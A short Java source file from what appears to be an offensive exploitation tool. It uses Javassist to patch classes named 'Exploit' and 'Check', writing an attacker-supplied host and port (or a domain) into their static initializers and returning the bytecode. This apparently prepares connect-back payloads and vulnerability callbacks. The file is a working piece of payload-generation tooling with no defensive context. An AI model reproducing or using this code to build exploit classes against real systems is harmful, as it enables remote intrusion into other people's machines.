package superman.utils;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

public class ClassUtil {
    public static byte[] insertSocketServerInfo(String host, int port) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.get("Exploit");
            String code = "host=\"" + host + "\";port=" + port + ";";
            clazz.makeClassInitializer().insertBefore(code);
            return clazz.toBytecode();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
    public static byte[] insertDomainInfo(String domain) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.get("Check");
            String code = "host=\"" + domain + "\";";
            clazz.makeClassInitializer().insertBefore(code);
            return clazz.toBytecode();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
